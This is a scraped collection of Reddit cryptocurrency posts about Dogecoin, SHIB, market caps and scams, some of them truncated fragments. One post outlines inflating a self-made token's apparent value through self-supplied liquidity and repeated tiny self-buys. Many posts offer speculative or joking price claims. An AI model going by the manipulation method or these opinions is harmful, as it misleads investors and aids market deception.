DOGE's only use-case argument is as a store of value to be used for transactions. In other words, it wants to compete with fiat currencies to be used in stores (not as an investment). Do you believe with its current inflation rate that this is possible?

Personally, I'm not into Doge and do not believe it to be a strong investment. But maybe we over-hype the infinite inflation argument if its use-case argument is as a transactional crypto. What do you guys think?",259,2021-08-26 17:02:32,212

DOGE,cryptocurrency,I (24F) feel like a bad b*tch compared to my boyfriend,"My boyfriend got into crypto around December of 2020, and he decided to put a large sum of his money in during the huuuuge run we had earlier in the year. His strategy was to put a few thousand in and watch the charts meticulously every few seconds. I even saw him swing trading and swapping coins, so I decided to learn everything I could about crypto and see if he was getting ""scammed."" 

I learned a lot. I watched him tell our friends to buy doge coin, saw him put lump sums into BTC and BITCOIN CASH, and heard him tell me about lots of coins that seemed like they wouldn't pan out long term and I tried to hold my breath. 

At this point (around April) I thought, hey, I know a little bit now, time to start my portfolio. I did something different than him, and put 25 dollars in each week. He kind of made a little fun of me, said it was ""cute"" that I was investing and trying, and also said it was kinda pointless to put that little amount of money in. 

Then came the ""crash"" that I was completely prepared for and mentally ready to see, and I just ... continued to put in my money weekly. He ""no longer wanted to talk crypto as much"" and stopped putting in money because all of his was already invested. 

I am proud to say that as of today (because I started building with one coin vs. His 10-15) ...

Someone who believes in the project will ride it out too, they will understand you taking profits, they will be confident someone else will buy in. They will generally behave in an encouraging manner.

With this first crypto I added liquidity in ONE at a 1 to 1 basis then I used 0.01 or 0.001 ONE at a time to buy my crypto for roughly 100 transactions this ups the price a little and so I leave the coin and over about 2 weeks the market brings it up. I sell a little to recover all that had gone to gas and this crashes my crypto to a very low price. Next test is creating coins that add liquidity too each other here's a glimps at them all.

&#x200B;

As you can see I had a lot of fun creating all of these but none of them really did very well so I then thought well I need to start with a better liquidity ratio so I create notbitcoin I then add 0.0001 to 1 ONE and I buy a few transactions of 0.001 ONE getting less and less NBTC each turn, now I have a value better than I had before so I start to add liquidity from the coins I have made making sure to work out the math on the current values as close as can with a small amount and then bang I add Billions in my own cryptos which soar the Liquidity and the value of the new coin I have made. If I sell any of the coins that I have added this will drop the price dramatically due to me being the only owner.  Plus I can only sell about 0.0002 at a time into ONE due to the low amount of liquidity in this coin and even that small sale would crash the value.

&#x200B;

Its crazy to think this is possible and this just shows you anyone can make crypto and make it look like it has a huge amount of value if I now make sure I buy a little every day and not sell for a few months next year this could be the next doge and will basically follow the market. I could start the trend the not crypto's instead of meme coins. Stay safe all hope this educates you that it really is too easy to make a crypto and just as easy to make one that looks amazing.

DOGE,cryptocurrency,"For the newcomers: the top 50 Cryptocurrencies, each explained with one sentence.","I tried summing up the top 50 coins in 1 or 2 sentences. It is not perfect and you obviously shouldn't make any decision based on this list, but hopefully it will help newcomers find some projects they're interested in and understanding a little bit better this technology.

If something is wrong or misleading, feel free to comment and I'll edit the post. Obviously in 2 sentences is hard to describe the whole project idea, but I tried my best.

&#x200B;

1. **Bitcoin (BTC):** the original. According to the creator (or creators?) Satoshi Nakamoto, it was created to allow “online payments to be sent directly from one party to another without going through a financial institution.”
2. **Ethereum (ETH):** Ethereum is the wonder child of crypto, acts as an infrastructure for most decentralized applications. Introduces smart contracts, which are like programs with specific procedures that, once deployed, no one can change.
3. **Tether (USDT):** a centralized stablecoin tied to the dollar (so Elon, please don’t try to pump it)
4. **Polkadot (DOT):** open-source protocol aimed at connecting all different blockchains and allowing them to work together, allowing transfers of any data.
5. **Cardano (ADA):** Another blockchain, trying to improve scalability, interoperability and sustainability of cryptocurrencies. Those who hold the cryptocurrency have the right to vote on any proposed changes in the software.
6. **Ripple (XRP):** centralized coin, most people don’t see a future for it after SEC went after it.
7. **Binance Coin (BNB)**: coin associated with the Binance exchange, so valuable since it is the most popular centralized exchange.
8. **Litecoin (LTC):** Bitcoin’s cousin, with faster transactions and lower fees.
9. **Chainlink (LINK):** the main idea is to LINK smart contracts with real-world data, verifying that this data is correct.
10. **Dogecoin (DOGE):** Wow, such high ranking! (Okay, now please let’s get Stellar back in the top 10).
11. **Bitcoin Cash (BCH):** fork of Bitcoin (so a copy with some differences), which tries to lower transaction fees and increase scalability but has been surpassed technology-wise by many other coins aiming to do just the same.
12. **Stellar (XLM):** talking about currencies, XLM is one of the coins aiming to do just that, with fast processing times and low fees. It has also already become a stablecoin! (I’m kidding).
13. **USD Coin (USDC):** another centralized stablecoin tied to the dollar, like USDT.
14. **Aave (AAVE):** take a bank and make it decentralized, where the liquidity comes from the users and they earn fees from borrows. This is Aave.
15. **Uniswap (UNI):** Another DeFi like Aave, but this time it’s an exchange like Binance, just decentralized.
16. **Wrapped Bitcoin (WBTC):** It’s just bitcoin wrapped in ethereum to be used in DeFi applications.
17. **Bitcoin SV (BSV)\*:** Bitcoin Scam Variant
18. **EOS (EOS):** another blockchain, aimed at being highly scalable for commercial use. It aims to make it as straightforward as possible for programmers to embrace the blockchain technology.
19. **Elrond (EGLD):** Blockchain architecture focused on scalability and high throughput, achieving this by partitioning the chain state and an improved Proof of Stake mechanism
20. **TRON (TRX):** have you seen Silicon Valley, when they try to create a decentralized internet? Yeah, Tron’s founder is Richard Hendricks. It is also one of the most popular blockchain to build decentralized applications on.
21. **Cosmos (ATOM):** several independent blockchains trying to create an “internet of blockchains”.
22. **NEM (XEM):** instead of controlling just money, you can control stock ownership, contracts, medical records, and stuff like that
23. **Monero (XMR)\*:** if you need drugs
24. **THETA (THETA):** decentralized video delivery network (peer-to-peer streaming). The token performs various governance tasks within the network.
25. **Tezos (XTZ):** another blockchain for smart contracts, but more eco-friendly and overall trying to encompass different advancements introduced by different blockchains in a single protocol.
26. **Terra (LUNA):** aiming to support a global payment network, it tries to create a decentralized stablecoin with an elastic money supply, enabled by stable mining incentives. Its related stablecoin is TerraUSD
27. **Maker (MKR):** MakerDAO is the organization behind DAI, one of the most famous stablecoins. MKR is a token that allows you to receive dividends and vote in governing the system.
28. **Synthetix (SNX):** protocol on the ethereum blockchain aiming to allow trading of derivatives (shorting or going long on a certain asset).
29. **Avalanche (AVAX):** open-source platform aiming to become a global asset exchange, where anyone can launch any form of asset and control it in a decentralized way with smart contracts. It claims to be lightweight, with high throughput and scalable.
30. **VeChain (VET):** a blockchain focusing on business use-cases more than on technology, bringing this technology to the masses without them even knowing they’re using it.
31. **Compound (COMP):** It’s the Bitcoin of DeFi. It was the first-mover and without him many other projects wouldn’t be around today.
32. **IOTA (MIOTA):** open-source decentralized cryptocurrency engineered for the Internet of Things, with zero transaction fees and high scalability since it uses a blockless blockchain where users and verifiers of transactions are the same (it may sound wrong but it’s actually a genius concept, impossible to sum up in a single sentence).
33. **Neo (NEO):** Blockchain application platform and cryptocurrency for digitized identities and assets, aiming to create a smart economy. It was one of the coins that suffered most after the 2018 bull run.
34. **Solana (SOL):** another blockchain aimed at providing super-high-speed transactions. It claims to be able to process 50k transactions per second and be perfect to deploy scalable crypto applications.
35. **Dai (DAI):** the decentralized stablecoin of MakerDAO, tied to the dollar.
36. **Huobi Token (HT):** it’s the official token of Huobi (a centralized exchange), providing advantages similar to BNB (Binance’s), for example fees discounts.
37. **SushiSwap (SUSHI):** a clone of UniSwap (so a decentralized exchange), where there’s a token (SUSHI) given as an additional reward for liquidity providers and farmers.
38. **Binance USD (BUSD):** Stablecoin issued by Binance, tied to USD.
39. **FTX Token (FTT):** It’s a token related to FTX, a platform allowing you to trade leveraged tokens based on the Ethereum blockchain. The token allows for lower fees and socialized gains.

43. **UNUS SED LEO (LEO):** another token, this time related to the iFinex ecosystem which allows you to save money on trading fees in Bitfinex.
44. **BitTorrent (BTT):** BitTorrent is a famous peer-to-peer file sharing platform. It is trying to get more decentralized by introducing its token, which grants you some benefits such as increased download speeds.
45. **Celsius (CEL):** Celsius is one of the first banking platforms for cryptocurrency users, where you can earn interest, borrow cash and make payments/transfers. The CEL token grants you some benefits such as increased payouts.
46. **Algorand (ALGO):** Algorand is a blockchain network aiming to improve scalability and security. ALGO is the native cryptocurrency of the network, used for a borderless economy and to secure stability in the blockchain.
47. **Dash (DASH):** It is a fork of Litecoin launched in 2014, focused on improving the transaction times of the blockchain and become a cheap, decentralized payments network.
48. **Decred (DCR):** it is a blockchain-based cryptocurrency aimed at facilitating open governance and community interaction. It achieves this by avoiding monopoly over voting status in the project itself, giving to all DCR holders the same amount of decision-making power.
49. **The Graph (GRT):** Trying to become the decentralized Google, it is an indexing protocol for querying networks like Ethereum. It allows everyone to publish open APIs that applications can query to retrieve blockchain data.
50. **yearn.finance (YFI):** part of the DeFi ecosystem, it is an aggregator that tries to simplify the DeFi space for investors, automatic the process of maximizing the profits from yield farming.

&#x200B;

\*EDIT:

A couple of coin descriptions were just jokes, here are the actual explanations:

* **Bitcoin SV (BSV):** It is a fork of Bitcoin Cash (which is also a fork of Bitcoin). Once again, the reason behind this is to ""stay true to Satoshi vision"", trying to improve scalability and stability.
* **Monero (XMR):** Monero's goal is simple: to allow transactions to take place privately and with anonymity. Even though it’s commonly thought that BTC can conceal a person’s identity, it’s often easy to trace payments back to their original source because blockchains are transparent. On the other hand, XMR is designed to obscure senders and recipients alike through the use of advanced cryptography. Obviously this made this coin the go-to on the dark web.",14810,2021-02-09 12:03:25,1588

Yes. I know nothing about Crypto. Yes, I know this is not the best investment. And yes, I’m trying to invest into something that will give me a ton of Coins (millions or billions of Baby Doge Coins) by simply betting into the very very unlikely odds of this Coin losing a few 0’s and therefore… giving me a ridiculous return of investment.

In those messages, he talked about putting Twitter on the blockchain, banning all bots, and charging 0.1 DOGE to tweet or retweet.

>“I have an idea for a blockchain social media system that does both payments and short text messages/links like twitter. You have to pay a tiny amount to register your message on the chain, which will cut out the vast majority of spam and bots. There is no throat to choke, so free speech is guaranteed.”  
“My Plan B is a blockchain-based version of twitter, where the ‘tweets’ are embedded in the transaction of comments.”  
“So you’d have to pay maybe 0.1 Doge per comment or repost of that comment.”

Me and a few friends tried to warn them but with all the Wallstreetbets and GME hype, it allowed a ton of crypto newcomers who didn't know what a ""pump and dump"" scheme is to get scammed.

This comes right after the large doge dump.

The worst part is, their moderators made no efforts to remove posts related to the scam. It is reported that /u/nvok (a moderator of /r/Ripple and /r/XRP) and fellow moderators were allowing the scam to be promoted and were removing posts that were negative towards it. They also ban any users that critique Ripple or XRP (the token of Ripple). It is unknown if they were involved in the scam, but it is evident they failed to educate their users.

Feel free to **report both of those subreddits** by contacting reddit admins. You can find any post in /r/Ripple or /r/XRP and report it via the reddit contact us page as there is no other direct way to report a subreddit.

But in the past year, there is clear divergence.

Does it indicate that crypto enthusiasts have lost interest in the once favorite DOGE the ultimate meme coin ?

DOGE,cryptocurrency,"Dear newbies, are you looking for a promising coin under $1, or even under $0.1? Don't!","**EDIT: read the post before you shill your sub-$1-coins, please, why does nobody do this today?**

I always see these posts a lot, but for some reason more in the past few days:

*""what are the best coins under $X?""*

And sure, it looks like that makes sense - Bitcoin (BTC) is super expensive already, while a coin like BitTorrent (BTT) is available for less than one cent! If you buy some now and they become as expensive as Bitcoin you will be rich! Bitcoin also used to be cheap! Right?

Lol, nah, wrong, obviously. The thing is: coin price doesn't matter. At all. Because it is strongly affected by how many coins are in circulation. There are currently about 18,700,000 BTC in circulation, there will never be more than 21,000,000. But there are 660,000,000,000 BTT at the moment and there will be 990,000,000,000 at some point. The important figure is the market cap, which is

**Market Cap =  Circulating Supply  X Coin Price**

So, for example, for BTC it would be  49,500 X 18,700,000, about 920 billion USD. So if we imagine BitTorrent becoming just as big as Bitcoin, how much would a single coin be worth? $1.38. So can't a single BTT be worth thousands of dollars, like BTC is? No, absolutely not. If 1 BTT would be worth 49,500, as 1 BTC currently is, its market cap once all the coins are in circulation would be almost 50,000,000,000,000,000. 50 quadrillion, or 50,000 trillion. The total amount of wealth in the world is about 300 trillion.

**tl;dr:** Coin price is NOT a good indicator how much a coin can still grow. Check the market cap and compare it to other coins to see how much a coin would need to grow to be as big as another coin. [The Coin Perspective](https://thecoinperspective.com) is a great website to make these comparisons. Also remember that you can buy fractions of a coin, like 0.001 BTC and don't have to buy a whole one.",8763,2021-05-15 15:08:46,1678
DOGE,cryptocurrency,"If SHIB has to go to even 10 cents, it will multiply the entire crypto market cap by 20x. It wont, it is just a shitcoin","SHIB is grossly over valued, just like dogecoin was overvalued back in March, and everyone who called it out back then was spot on. 

Of course, the SHIB shills are peddling the narrative that it will go to $1. 

Currently, one SHIB = $0.00002715

To go to $1, it has to go up by 3,683,141%. Yes, it has to go up by 3 million %... 

To go to even 10c, it has to go up by 362,884%

Apparently, there are 394,796,000,000,000 SHIBs in circulation. 


Even at 10c, the market cap of SHIB alone will be over $39 Trillion. 

To be specific, a market cap of Thirty-Nine Trillion, Four Hundred Seventy-Nine Billion Six Hundred Million dollars

Today, the entire crypto market cap is around $2.3 Trillion. So even at 10c, SHIB will be worth 20x today's crypto market cap. 

Firstly, this is not happening anytime soon. 

Secondly, this is not happening anytime in the future either.

There is a higher probability of SHIB going to zero over it going to $1 or even 10c. 

Hundreds of shitcoins bust onto the scene during a crypto boom cycle, only to disappear during the bust. 

SHIB is a token that has no real value, apart from exploiting amateur investors and unit bias and traders riding it for quick gains. Almost everyone is in SHIB purely for profit. Many want over night riches and plan to hold till $1, which they believe will come soon.. many others are riding it got quick gains, and there is nothing wrong in that. Many shitcoins can give quick gains. But for them to claim there is something innovative or anything resembling new technology in SHIB is just delusional. 

The whole project is quite an exquisite combination of several pyramid scheme elements, and is quite well done. The devs have really delivered on their promise of making themselves rich.",5529,2021-10-10 20:46:08,2678

DOGE,cryptocurrency,"For the love of god, please learn what market caps are","I’m seeing so many people just not have any understanding of one of the most basic measurements of valuation. If you don’t know what “market cap” means and you’re trying to get in early on “moonshots,” I’m begging you to take 2 minutes to read.

Market capitalization is the total value of all members of an asset. Just circulating supply * price. (Edited note: worth mentioning that you should be using the average price over different platforms. THAT BEING SAID: if the platform you’re looking at shows a price that would imply a market cap in the quadrillions, then that DOES mean the price is too high there. Even though the market cap calculated by that price wouldn’t be an accurate measurement of the combined value of the coin, it IS a good indicator of whether or not it will actually be able to maintain that price. If it’s not an accurate price, arbitrage is going to correct the price soon enough.) 

What does it tell us? It lets us know how much ~~money~~ value is attributed to it, and how it compares to other coins.


Take SHIB for an example. It has a circulating supply of **400 trillion tokens,** so at its price of 0.003¢, it has a market cap of nearly $12 BILLION. That’s 1/5 of doge’s cap of $60B, and it is therefore already one of the largest cryptocurrencies out there.

At 10¢, the market cap would be $40 trillion, double the US annual GDP. It will not hit 10¢. It will not hit 1¢z It will not hit 0.1¢. It MIGHT hit 0.01¢ because of how the market has been working lately, but those other targets are just mathematically far too high.

(Another edited note: when I say reach that price, I meant having a stable price that high on most/all trading platforms. Thanks to those of you who corrected me on that)

The creators want you to see all those zeros in front of the price and assume buying it would be “getting in early.” Don’t let them fool you. You are not getting in early by buying a coin with a $12B market cap. You are almost certainly very very very late.

DYOR. Please.

Edit:

A lot of people are hung up on “how much money is in it.” I didn’t mean it in terms of principal investment, I meant it in terms of valuation. I have a lot of BAT that I bought at 30 cents. I don’t value it as if it were the 30 cents per token that I bought it at, because I know I can just sell at the market price if I need to.

The argument that it would crash if everyone tired to sell at once is fallacious. It’s valued at what it is and it ISN’T crashing to nothing from everyone selling at once because people aren’t trying to all sell at once. They would rather have the BAT than the $1.30. If they didn’t, they would have sold already.

Edit 2:

Think I came off wrong here. Not a financial expert, that much is obvious. I know that things can crash from everyone selling, I was trying to say that everyone selling is BECAUSE they value the coin’s value in fiat/btc/eth/whatever less than they do the coin.

Second, I know there are flaws in it, as it can’t be instantly converted. I’m not trying to make it out to be some perfect metric of value. My intentions here are solely to tell people that their millions of scamcoin that they bought for $10 probably is not going to make them a 9 figure crypto whale.

DOGE,cryptocurrency,Doge is still in the top 10. Where will it go from here?,"Where do you think Doge will go in the next bull market?

Doge is a polarising project to say the least here but throughout the years it has proven that its not going anywhere anytime soon.

Looking at its market cap, it is still in the Top 10 in a bear market where coins without any utility usually die. Due to its longevity it seems to me that it’s beyond pure hype (although it benefited from hype immensely last bull run).

Im actually surprised that it has stayed higher than some of this subs favourite coins.

Im not saying that anyone should put money in Doge, but I think its important to note that something that started as a joke is still laughing in a sense.

I wonder what your thoughts are?",32,2023-03-23 09:03:11,157
DOGE,cryptocurrency,It pains me to buy DOGE,"But my mother insists....INSISTS that I buy it for my nephew on her behalf.  You know, ""for his future.""  She gave me some money to buy crypto for him (he just turned one) and said that I have to dedicate a certain amount to buy DOGE for him.  So I set four limit buys, and so far two of them have filled.  If the other orders never fill....they never fill.  Right?

Thankfully, she let me pick other coins for him, too.  Her stipulation was that they had to be ""cheap"" (in her mind, that means under a couple of dollars per coin) and it would have to be whatever I would buy for myself.  So I picked ADA, VET, and MATIC.  Fortunately I bought it all during this dip.

DOGE,cryptocurrency,$8000 SHIB wallet from Aug 2020 now worth $5 billion,"Reposting my comment from the daily.

I haven't been in crypto for very long or very deep, but this is the craziest trade I've ever seen. That is like 6 MILLION X returns, not %, in like a little over a year.

I've largely ignored SHIB, not even on fundamentals and it being a real coin or whatever, but even on a meme level, I thought DOGE has it beat, that it was just a copycat and won't have the history or community power of the original DOGE.

But I guess I was wrong. SHIB lays bare how subjective value really is. I thought it was loose before, but valuation is actually 100% based on feeling, 0% objective anything.",5607,2021-10-27 21:39:05,1957
DOGE,cryptocurrency,"The fact that DOGE, SHIB and ELON outperformed most coins is a testament to the importance of marketing in this market","Sometimes it doesn’t really matter how much technically advanced or utilitarian a project is if it doesn’t have the proper marketing and hype.

So many projects with great technology that take a lot of effort got easily outperformed by coins like DOGE, SHIB and recently ELON after the 100x it did.

Hype is very important in this market and its sad to see that some really good projects with high potential simply don’t realize that and end up failing cause of that…

It takes up a lot of time and effort to create and develop a good utility project. Don’t let it fail just of bad marketing.",172,2022-01-05 11:27:51,168
DOGE,cryptocurrency,If you invested $1000 into SGT a week ago it would be worth $52 today *the other side to these million dollar equations*,"We’ve all see the headlines about SHIB and others, *$1000 a year ago would be millions today,* but at the point when you would have needed to invest to have those gains today — they weren’t different than most of the hype coins that landed people in the red. 

Shib took off yes, don’t misunderstand me — I’m perfectly happy with that. But the gamble those holders took **then** is way underestimated **today** now that everyone knows of it. 

The dozens of other coins that fucked people hard — don’t make for as good of a one year equation. I took the liberty of going through the **most popular** moonshots posts from a year ago.. to bring you some examples:

- BEYOND PROTOCOL - “bigger than Bitcoin and ETH combined” is the slogan and it was the most popular post in the last year, $1000 a year ago would be worth $647 today 

- BabyKrypto - only 47 days old but if you bought $1000 worth when they started advertising it on Moonshots, you’d have $125 today 

- $1000 in SHIBAFEVER would have gotten you 77 million coins just a week ago, worth $153 today 

After this we started getting into rebase tokens where the “price” doesn’t move they just “adjust” the tokens that you hold, but you can’t sell either so I’d say $1000 into those burned up pretty quickly. 

- There’s also Floki Jr, Floki New York, Micro Shiba and Chopper Inu, Catch Doge, Doge back, and Robo Doge that I can’t even find accurate information on.. but I’m guessing those didn’t make many crypto millionaires. 

Anyway, I’m seeing a lot of posts asking how to jump on a newly listed coin first and where to find them, and I just wanted to say .. I don’t even think those that have held SHIB for a year give themselves enough credit for how big a leap they took. This style of investing breeds a lot more losers than winners, and winners rarely stop there and cash out — they’re on the hunt for the next opportunity to lose money.

DOGE,cryptocurrency,FINALLY got all my crypto off Robinhood. You should too. ASAP.,"I'll admit it: I've kept a large sum of my crypto on Robinhood this whole time... until now. To be fair, I had stopped actively buying with them a year ago, but had decided not to sell since they had announced they were developing crypto wallets. So I decided to just hodl until I could transfer out... and that time has finally come! Last night I finally received word that my wallet was ready. **As of this morning the remaining assets I has hodling have been transferred OUT!**

Screenshot: [https://imgur.com/a/unzF2sS](https://imgur.com/a/unzF2sS)

**I STRONGLY urge you to do the same if you have not done so already.** It's worth the gas price too ([which is a little lower than normal right now](https://ycharts.com/indicators/ethereum_average_gas_price)). If you've quietly been waiting for your Robinhood crypto wallet, it should come soon. I was around number 55k in line to receive mine.

*Why transfer out?* If you're not aware, Robinhood restricted trades during the the GameStop/meme-stock mania last year which effectively helped shady hedge funds and hurt regular folk like you and I ([see more about that here](https://www.cnet.com/personal-finance/investing/robinhood-backlash-what-you-should-know-about-the-gamestop-stock-controversy/)). They were also fined $70M by FINRA over other shady practices, including having ""outages"" during big market swings between 2018 and 2020 ([check that out here](https://www.nytimes.com/2021/06/30/technology/robinhood-fined-misleading-customers.html)). This was especially a frustration last year when Robinhood suddenly suffered ""technical difficulties"" during the epic Doge runup ([more info here](https://www.theverge.com/2021/5/4/22419159/robinhood-dogecoin-outage-crypto-trading-crash#:~:text=Robinhood%20confirmed%20that%20it%20experienced,the%20beginning%20of%20the%20day)). So then, it's pretty clear that Robinhood's interests are NOT with you. **Why trust them with your assets when they block you from making financial decisions during critical market movements?**

I'm not the only one in this sub that is alarmed by Robinhood, please see these additional posts and comments from our fellow sub-mates for more information so you can make your own decision:

And this doesn't even take in consideration inflation.

We get sad when out stock/crypto plummets -20%... Why don't we have the same reaction with FIAT? It's literally the same thing.

I'm personally not invested more than 20% of my entire wealth into crypto, because (let's be honest), it's a high-risk asset, or so I thought.

Now I'm everyday more convinced that the difference between crypto and FIAT is very subtle.

DOGE,cryptocurrency,Interest in Shiba Inu seems to have dried up completely,"A few months ago, the meme-coin Shiba Inu (SHIB) was pretty much in the spotlight. The cryptocurrency rose astronomically within a short period of time, and crypto investors' interest in the project was gigantic at times. Shiba Inu even made it into the top 10 largest cryptocurrencies. However, the price of Shiba Inu has since plummeted, and the hype and interest surrounding the project seems to have completely evaporated as well.

&#x200B;

**Google Trends**

In fact, last year Shiba Inu was so popular that it topped CoinMarketCap in terms of searches. Also on the Google, there was a huge search for, for example, ""Shiba Inu"" or ""Buy Shiba Inu"" all over the world.

&#x200B;

However, this search volume on Google has totally dried up in the last 90 days. Google Trends shows that a peak in terms of interest was reached on October 29 last year. Since then, this search volume has plummeted by a whopping 92%!

&#x200B;

**Shiba Inu Price**

The price of meme-coin did not manage to perform much better in recent months. Since the all-time high set at the end of October 2021, the SHIB price has dropped more than 75%.  In fact, at the beginning of January, Shiba Inu's market capitalization plummeted by more than $3.5 billion in just one week.

&#x200B;

Although the team at Shiba Inu is still working hard behind the scenes to get the project back on track, this seems to have become quite a task. Here and there SHIB still gets listed on a new crypto exchange, but the extreme price appreciation we saw in the past seems to be a thing of the past so far.

&#x200B;

Of course, Shiba Inu is not the only cryptocurrency that is performing poorly at the moment. Due to the high uncertainty in both the crypto and equity markets, most cryptocurrencies are deep in the red. Nevertheless, the demise of SHIB can be called an outlier.

&#x200B;

Number of transactions in its blockchain has fallen down to a meagre ~20k figure from its ATH of ~140k.

Number of unique addresses sending doge is at all time low at ~19k from its ATH of ~131k.

Market cap has shrunk by around 75% from its ATH in May. 

And so on.

All that said, it's worth looking at the sentiments which were fueling the momentum of doge of upwards v/s now. There were people literally believing that Doge would see the mass adoption that Bitcoin is destined to see. That doge would become the currency that Bitcoin aspires to be. Folks even gave reasoning to its inflationary nature saying that only an inflationary natured could replace the existing inflationary natured $.

My cousins and a few colleagues bought this idea and got into doge at prices way higher than its current price. They all now have written obituaries on doge in one platform or the other.

Similarly, where are those people now when doge is struggling to maintain 20 cents. Most of them are busy announcing the death of this coin.

This goes on to prove that people would give any reasons, shill through any means when a coin/token is performing good and would announce it dead as soon as it exits its good performance.",45,2021-12-13 04:29:10,256

As the title says, I'm in a position right now to think it could be in my best interest long-term to sell XRP, LTC and DOGE (though I'll lose around 200 usd right now) but I fear they might not go back up and in the long run lose both the profit from them and the possible profit from turning them into BTC (as it will more than likely go up and up).

So basically, which do you think is the best strategy? 

a) sell the altcoins, lose 200 usd right now, have a change to have a bigger profit from BTC

b)keep the altcoins, HODL right now, maybe the coins don't bounce back up and make less profit from BTC in the long run.

I'm not just looking for some more advice to blindly take, I've been doing a lot of reading this weekend and hope to gain some insight from the perspectives of people here.

DOGE,cryptocurrency,20% dip? 🤷‍♂️ Looks pretty normal to me.,"It's April 2011, I am mining on some number of Radeon 5850s making around 1.1 BTC each day. The price is crossing $2. 

It's May 2011, I am mining on some number of Radeon 5850s, doubled. Mining difficulty is climbing quickly, and so is the price. We're almost at $10 by the end of the month and I'm still making around 1 BTC per day, somehow managing to stay on par with the difficulty as I buy more graphics cards.

It's early June, and as I am powering on even more GPUs, the price hits roughly $32 before halving over that weekend. 

November 2011, we reach $2 after several months of everyone declaring it dead. I am on something like 8 5850s now, probably still making around 1BTC, maybe a bit less, it's difficult to remember after 10 years. After the monstrous crash of about $30, things begin to pick up by the end of the year and we enter 2012 at about $5.

We crash from $7 to $4 between January and February, then from $13 to $8 over one weekend in August. It's dead, each time.

It's 2013 and things are batshit insane. We have some minor 10% drops through the year but everyone is buying. Everyone is mining. I heat my new rental property with Radeon 7990s and only heat the house with graphics cards during the entire winter from 2012-2013. About 11 steps up the stairs, you go from freezing cold to being blasted with heat, like when you exit the plane into Spain.

By April we all lose our shit and people are buying bitcoin for $100. By the 9th they are paying $200 and within a week decide that $70 is more reasonable - a 66% drop in a week. Of course, people can't make up their minds whether Bitcoin is a scam or if it's the future of humanity, so the price goes haywire and we see regular gains and drops of 10/20/30%.

It's November 2013. Bitcoin is not a scam. Clearly, because it's now worth $200. Or is it worth $650? No, it's worth $550. Now it's $700. Nope, $1,100. Now it's $950. 

Now it's December and it's $1,100 again. But what the hell is going on, MtGox won't let me log in despite me not sleeping and spending the last 15 hours through the night trying. Now I'm late for work and I've lost 20% of my money, even though I've actually gained 1000% this year, I'm only bothered about losing 20% of what I had a day ago, just like literally everyone else.

It's 2014. It's also most of 2015. The entirety of both years. Bitcoin is dead. Never coming back. We're down to $200. Mining still makes me the same $2-3/day that it ever has, even though the 1BTC/day from 2011 is now worth $200+/day. I give up. Everyone else gives up after buying these new things called shitcoins. I forget, not bothering to sell what I had left as it's barely enough to buy a small used car. 

It's 2016 and apparently Bitcoin has tripled since I last looked at it. What. You what. What. Everyone now wants Ethereums. It's like Bitcoin, but it'll fit on my hard drive. Everyone's shitcoins have disappeared. The however many thousands of Doggo coins I mined before I quit have disappeared along with the exchange. Ethereums are bringing out these new shitcoins that actually do something, like Golem, which is like Seti@home but will eventually literally do everything and generate an income for you. Great! Ethereum shitcoins are not called shitcoins. The world of cryptocurrency is very different to how i remember it. I swap half my BTC for ETH and then 80% of that for various tokens.

It's 2017. Nothing bad is happening. Everyone is investing in ICOs for non-shitcoins. Everyone's making $2k/day just trading. Everyone's also making $500-2k/day just holding. Everyone has bitcoin and ether, as well as a tonne of ERC-20 tokens. Some people also have Bitconnect which seems very much like the HYIPs I used to join during my PTC/PTS days as a teenager. Seems like a scam, no good. Ethereum has several 20-30% drops throughout the year. Seems normal, I'm no longer phased after 2013. Everyone in my office is interested. They all discuss it at $10, but ask me about investing $15k when the price hits $300. Finally, they enter at $600 and no one does any work for the rest of the year. We just talk crypto.

It's the second half of 2017. I make more on crypto in one day than at my day job in a month. Literally everything is going up. No one considers that it'll ever drop again. I'm like: ""🤷‍♂️ Looks pretty normal to me, but I better sell some soon else..""...

Actually, it's January to April 2018. New York bonuses or Chinese New year or some seemingly random event makes everyone sell literally everything. Everyone had put all their bitcoin into ether, and then all their ether into ICOs. What was once 25BTC was now 400,000,000 various ERC-20 tokens, or kittens, worth around $200. Not only did everyone sell their tokens, causing them to crash, but everyone sold everything else, making everything else crash. Crashception. Every second word on reddit is ""crash"".

Ether went from $1,200 to $75 in a year or so. Declared dead by everyone.

It's 2018-2020. I'm like, well, not sure. Probably will repeat the cycle of dips, moons and crashes, but probably should have sold. How many Deloreans could I have bought? Better not check my ""How many Deloreans I can afford if I traded all of my cryptos for deloreans.xlsx"" spreadsheet. My heart and soul must be dead. I have felt no emotion or regret during the crash. 2013 had used up all of that. All of my colleagues are bored and stop talking about crypto. Despite what they said, they weren't interested in the tech, only the money. One buys a folding phone for $1,500 with what was once $10k of Galaxy Ripple chocolate bars, I think. I buy more Ether, deciding to not exchange any for other tokens. From now on, only BTC and ETH for me. I buy some occasionally, but not as much as I should. I pretty much leave crypto will the expectation that we'll just repeat it all again in a few years.

It's 2021, things are batshit insane again. Already?Woopdedoo. Everyone's talking to me about crypto. Fgs. I just decided to try the real stock market where people cry over a 3% crash. Everyone is jumping back in. What is defi and nft? Are cryptokitties nft? Is my kitty still alive? Who knows. Give it 5 years and there'll be a yet another new equivalent to shitcoins.

Bitcoin drops by $10k in January, I'm like, meh. I play with Coinbase Earn and shortly make a mint.

It's the present: Bitcoin drops another 10k in February, even though it's still higher than the last drop. I'm like, meh. Everyone panics. For some reason I decide to write a 20 word reddit post and it turns into whatever the hell I'm writing now for whatever point I'm trying to make. Something about not declaring it dead over a $10k drop when we're still up by $20k this year.

It's mid 2021. Bitconnect is back and they want your doge. Bitcoin hits $80k but crashes by 20% down to $64k. The world is on fire and shit is hitting the CPU fan. It crashes by another $5k before hitting $85k. Ether was $4k but now deemed dead because it's only $2k. Soon it'll be $5k. Elon tweeted about doge being the national currency of Mars. It's a joke, but now doge is $42 and I remember that old exchange that vanished with probably $420,000,000 worth of my doge, and 50 LTC. Twelve seconds later it's back to $0.10. Everyone is mad because it is now only worth double of what it was worth yesterday, even though it is down from ,12 seconds ago.

